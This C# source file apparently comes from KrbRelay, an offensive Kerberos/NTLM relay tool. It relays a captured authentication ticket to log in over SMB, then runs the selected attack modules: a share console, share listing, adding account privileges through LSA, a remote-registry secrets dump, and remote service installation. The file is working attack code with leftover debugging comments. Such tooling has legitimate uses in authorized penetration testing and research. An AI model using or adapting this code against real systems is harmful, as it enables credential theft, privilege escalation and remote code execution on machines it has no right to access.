using KrbRelay.Com;
using SMBLibrary.Services;
using System;
using System.IO;
using System.Linq;
using System.Reflection;
using static KrbRelay.Program;

namespace KrbRelay.Clients
{
    public class Smb
    {
        public static void Connect()
        {
            //string filePath = "c:\\temp\\moreprocess.bin";

            // Read the binary file into a byte array
            //byte[] byteArray;
            byte[] b=new byte[2];
            int fraglen, authlen;
            //Program.apreqBuffer = byteArray;
            Array.Copy(Program.apreqBuffer, 8,b, 0, 2);

            //int ticketOffset = Helpers.PatternAt(Program.apreqBuffer, new byte[] { 0x6e, 0x82}); // 0x6e, 0x82, 0x06


            fraglen = BitConverter.ToInt16(b, 0);
            Array.Copy(Program.apreqBuffer, 10, b, 0, 2);
            authlen = BitConverter.ToInt16(b, 0);
            //int ticketOffset = Helpers.PatternAt(Program.apreqBuffer, new byte[] { 0x60, 0x82, 0x07 }); // 0x6e, 0x82, 0x06
            //Console.WriteLine(Program.HexDump(Program.apreqBuffer));
            //Console.ReadKey();
            
            Console.WriteLine("fraglen = {0} authlen={1}", fraglen, authlen);
            //byte[] destinationArray = new byte[Program.apreqBuffer.Length - ticketOffset]; // Subtract 3 for skipping the first 3 bytes
            byte[] destinationArray = new byte[authlen]; // Subtract 3 for skipping the first 3 bytes
                                                         //Array.Copy(Program.apreqBuffer, ticketOffset, destinationArray, 0, Program.apreqBuffer.Length - ticketOffset);
                                                         //Array.Copy(Program.apreqBuffer, fraglen-authlen, destinationArray, 0,authlen);
            /*
            int snameoffset = Helpers.PatternAt(destinationArray, new byte[] { 0x52, 0x50, 0x43, 0x53,0x53 }); // 0x6e, 0x82, 0x06
            Console.WriteLine("snameoffset {0}",snameoffset);
            // Copy from the source array starting from the fourth byte to the destination array

            int l1 =  snameoffset;
            byte[] b1 = new byte[snameoffset];
            
            Array.Copy(destinationArray, 0, b1, 0, snameoffset);
            Console.WriteLine("l1 {0}", l1);
            Console.WriteLine(Program.HexDump(b1));
            Console.ReadKey();

            
            int l2 = destinationArray.Length - snameoffset - 5;
            Console.WriteLine("l2 {0}", l2);
            Console.ReadKey();
            byte[] b2 = new byte[l2];
            Array.Copy(destinationArray, snameoffset + 5, b2, 0, l2);
            Console.WriteLine(Program.HexDump(b2));
            Console.ReadKey();


            byte[] b3 = new byte[snameoffset + 4 + l2];
            Array.Copy(b1, 0, b3, 0, l1);
            Console.WriteLine(Program.HexDump(b3));
            Console.ReadKey();

            int l3 = snameoffset;
            Console.WriteLine("thirs copy");
            b3[l3 - 1] = 0x04;
            b3[l3] =  0x43;
            b3[l3 + 1] = 0x49;
            b3[l3 + 2] = 0x46;
            b3[l3+ 3] = 0x53;
            Console.WriteLine(Program.HexDump(b3));
            Console.ReadKey();

            Array.Copy(b2, 0, b3,l3+4, b2.Length);
            
            */
            //ticket = Program.apreqBuffer.Skip(ticketOffset).ToArray();

            //Array.Copy(destinationArray,10, b, 0, 2);

            // Convert the byte array to a 16-bit integer
            //short authlen = BitConverter.ToInt16(b, 0);
            //ticket = destinationArray;

            ticket = Program.apreqBuffer;
                //destinationArray;
            //ticket = Helpers.ConvertApReq(destinationArray);
            //ticket = Helpers.ConvertApReq(destinationArray);
            //byte[] newticket = new byte[ticket.Length - 8];
            //Array.Copy(ticket,8,newticket,0, ticket.Length - 8);
            //Console.WriteLine(Program.HexDump(newticket));
            byte[] response = smbClient.Login(ticket, out bool success);
            
            Console.WriteLine("succes {0}", success);
            if (!success)
            {
                if (Program.ntlm)
                {
                    ntlm2 = response;
                    Console.WriteLine("[*] NTLM2: {0}", Helpers.ByteArrayToString(ntlm2));
                }
                else
                {
                    apRep1 = response;
                    Console.WriteLine("[*] apRep1: {0}", Helpers.ByteArrayToString(apRep1));
                    
                }
            }
            else
            {
                Console.WriteLine("[+] SMB session established");

                try
                {
                    if (attacks.Keys.Contains("console"))
                    {
                        Attacks.Smb.Shares.smbConsole(smbClient);
                    }
                    if (attacks.Keys.Contains("list"))
                    {
                        Attacks.Smb.Shares.listShares(smbClient);
                    }
                    if (attacks.Keys.Contains("add-privileges"))
                    {
                        Attacks.Smb.LSA.AddAccountRights(smbClient, attacks["add-privileges"]);
                    }
                    if (attacks.Keys.Contains("secrets"))
                    {
                        Attacks.Smb.RemoteRegistry.secretsDump(smbClient, false);
                    }
                    if (attacks.Keys.Contains("service-add"))
                    {
                        string arg1 = attacks["service-add"].Split(new[] { ' ' }, 2)[0];
                        string arg2 = attacks["service-add"].Split(new[] { ' ' }, 2)[1];
                        Attacks.Smb.ServiceManager.serviceInstall(smbClient, arg1, arg2);
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine("[-] {0}", e);
                }

                smbClient.Logoff();
                smbClient.Disconnect();
                Environment.Exit(0);
            }
        }
    }
}